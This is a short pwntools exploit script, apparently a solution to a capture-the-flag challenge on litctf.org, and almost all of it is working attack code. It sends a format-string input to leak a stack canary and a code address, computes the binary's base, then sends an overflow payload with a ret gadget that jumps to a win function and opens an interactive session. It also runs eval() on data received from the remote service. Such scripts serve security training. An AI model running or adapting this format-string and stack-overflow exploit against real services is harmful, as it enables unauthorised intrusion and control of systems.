from pwn import *

offset = 0x12ae

elf = context.binary = ELF("./s")

NC = "nc litctf.org 31791".split()

r = remote(NC[1],NC[2])

r.sendline(b"%13$p|%11$p")

leak = list(map(eval,r.recvuntil(b"00").split(b"|")))

elf.address = leak[0] - offset

payload = p64(leak[1])*7 + p64(elf.address + 0x000000000000101a) + p64(elf.sym.win)

r.sendline(payload)

r.interactive()